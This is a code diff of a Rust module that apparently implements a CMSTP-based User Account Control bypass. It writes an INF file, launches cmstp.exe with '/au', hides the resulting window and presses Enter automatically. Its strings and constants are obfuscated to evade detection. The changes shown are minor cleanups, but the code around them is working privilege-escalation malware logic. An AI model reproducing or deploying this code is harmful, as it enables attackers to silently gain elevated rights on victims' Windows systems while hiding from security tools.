@@ -1,20 +1,12 @@
 use enigo::{Direction::Click, Enigo, Key, Keyboard, Settings};
 use rand::distributions::{Alphanumeric, DistString};
 use std::ffi::CString;
-use std::os::raw::{c_char, c_int, c_void};
+use std::os::raw::{c_int, c_void};
 use std::path::Path;
 use std::process::Command;
-use std::{fs, str};
+use std::fs;
 use std::{thread, time};
 use windows_sys::Win32::UI::WindowsAndMessaging::*;
-
-
-type GoCallback = extern "C" fn(*const c_char, c_int) -> c_int;
-
-
-#[cfg(target_os = "windows")]
-const CREATE_NO_WINDOW: u32 = 0x08000000;
-
 pub fn execute(cmd_location: &str) -> c_int {
     let cmstp_location = cryptify::encrypt_string!("c:\\Windows\\System32\\cmstp.exe");
     if !Path::new(&cmstp_location).exists() {
@@ -34,7 +26,7 @@ pub fn execute(cmd_location: &str) -> c_int {
 
     fs::write(&inf_path, inf_data).expect(&cryptify::encrypt_string!("error writing to the file"));
 
-    Command::new(&cmstp_location)
+    let _ = Command::new(&cmstp_location)
         .args([cryptify::encrypt_string!("/au"), inf_path])
         .spawn();
 
@@ -48,7 +40,7 @@ pub fn execute(cmd_location: &str) -> c_int {
 
 fn set_window_active() -> bool {
     let mut enigo: Enigo = Enigo::new(&Settings::default()).unwrap();
-    let mut window_handle: *mut c_void = std::ptr::null_mut();
+    let mut window_handle: *mut c_void;
 
     let mut loop_limit = 10;
     loop {
@@ -72,7 +64,7 @@ fn set_window_active() -> bool {
             SetForegroundWindow(window_handle);
             ShowWindow(window_handle, goldberg::goldberg_int!(0));
         }
-        enigo.key(Key::Return, Click);
+        let _ = enigo.key(Key::Return, Click);
     }
     return true;
 }
